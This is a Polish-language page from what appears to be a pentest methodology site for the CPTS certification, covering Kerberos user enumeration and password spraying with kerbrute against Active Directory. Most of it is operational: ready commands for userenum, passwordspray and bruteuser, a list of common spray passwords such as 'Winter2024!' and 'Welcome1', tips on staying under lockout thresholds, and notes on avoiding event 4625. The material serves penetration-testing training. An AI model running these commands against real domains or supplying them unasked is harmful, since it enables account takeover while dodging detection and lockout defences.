---
layout: ad_vector
title: kerbrute — userenum & password spraying
slug: kerbrute
category: recon
order: 1
pre_reqs:
  - reachable_kdc_port_88
  - list_of_potential_usernames_or_domain
tools: [kerbrute]
chain_inputs: [DOMAIN_FQDN, DC_IP]
chain_outputs: [USER, PASS]
progress_total: 6
---

## mechanism

`kerbrute` wysyła **AS-REQ** z fałszywym timestampem. KDC odpowiada:

- **KDC_ERR_PREAUTH_REQUIRED (24)** → user istnieje, ma pre-auth
- **KDC_ERR_C_PRINCIPAL_UNKNOWN (6)** → user nie istnieje
- **KDC_ERR_CLIENT_REVOKED (18)** → user istnieje ale zablokowany
- **AS-REP bez pre-auth** → user istnieje i NIE MA `DONT_REQ_PREAUTH` — AS-REP roasting w kolejnym kroku

Idealnie ciche, brak Windows event ID `4625` (bo nie ma logona LM/NTLM), zostawia tylko `4768 (0x18)` na DC. Do sprayowania używaj `--delay` żeby nie przekroczyć **AccountLockoutThreshold** — sprawdź polityki: `net accounts /domain`.

## user enumeration

<details>
<summary>[+] wyjaśnienie flag</summary>

- `userenum` → tryb wyliczania kont
- `-d $DOMAIN_FQDN` → nazwa domeny (FQDN, nie NetBIOS)
- `--dc $DC_IP` → wymuś konkretny KDC (bez tego kerbrute robi DNS SRV lookup)
- `-o out.txt` → zapisz trafienia
- `-t 50` → threads (default 10, wyżej bardziej głośno)
- `-v` → verbose, pokazuje też błędy

</details>

{% include cmd.html env="kali" cmd="kerbrute userenum -d $DOMAIN_FQDN --dc $DC_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -o users_valid.txt" %}

{% include cmd.html env="pwnbox" cmd="kerbrute userenum -d $DOMAIN_FQDN --dc $DC_IP /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt" %}

## password spraying (znany user list, słownik haseł mały)

<details>
<summary>[+] wyjaśnienie flag</summary>

- `passwordspray` → single-password / multi-user
- `--dc $DC_IP` → celuj w konkretny DC (jeśli replikacja lockoutów nie działa, spraying na innym DC jest bezpieczniejszy)
- `-o` → log trafień
- ⚠️ zawsze sprawdź `AccountLockoutThreshold` przez `net accounts` / `Get-ADDefaultDomainPasswordPolicy` — dla threshold=5 rób max 3-4 próby na jednego, potem czekaj `LockoutObservationWindow`

</details>

{% include cmd.html env="kali" cmd="kerbrute passwordspray -d $DOMAIN_FQDN --dc $DC_IP users_valid.txt 'Winter2024!'" %}

{% include cmd.html env="kali" cmd="kerbrute passwordspray -d $DOMAIN_FQDN --dc $DC_IP users_valid.txt 'Welcome1'" %}

### CPTS-relevant spraying dictionary (base patterns — customize per season/company)

- `<Company>2024`, `<Company>2024!`, `<Company>1`, `<Company>123`
- `Password1`, `Password1!`, `P@ssw0rd`, `P@ssw0rd!`
- `Welcome1`, `Welcome123`, `Changeme1`
- `Winter2024!`, `Summer2024!`, `Autumn2024!`, `Spring2024!`
- `<season><year>!` (aktualna data + poprzednie 2 sezony)
- `<Company>@2024`, `<netbios>1`, `<netbios>2024`

## brute single user (z pełnym słownikiem)

{% include cmd.html env="kali" cmd="kerbrute bruteuser -d $DOMAIN_FQDN --dc $DC_IP /usr/share/wordlists/rockyou.txt $USER" note="dużo hałasu, użyj tylko gdy brute jest sensowny (lockout=0)" %}

## checklist

- [ ] zebrałem listę potencjalnych userów (OSINT, LinkedIn, `ldapsearch -x -H ldap://$DC_IP -b '' -s base namingContexts`)
- [ ] uruchomiłem `kerbrute userenum` → mam plik `users_valid.txt`
- [ ] sprawdziłem `AccountLockoutThreshold` na DC (`Get-ADDefaultDomainPasswordPolicy`)
- [ ] wykonałem 2-3 rundy spraying na CPTS-typowe wzorce
- [ ] wyeksportowałem trafienia do kontekstu (`$USER`, `$PASS` w top-barze)
- [ ] przekazałem do dalszych wektorów: ASREP-roasting / Kerberoasting / BloodHound

## follow-up

- **ASREP-roasting** — `/AD_metodology/asrep-roasting/` — filtruje userów z `DONT_REQ_PREAUTH`
- **Kerberoasting** — `/AD_metodology/kerberoasting/` — gdy masz już `$USER:$PASS`
- **BloodHound (legacy/CE)** — collect z `$USER:$PASS` żeby zmapować graf
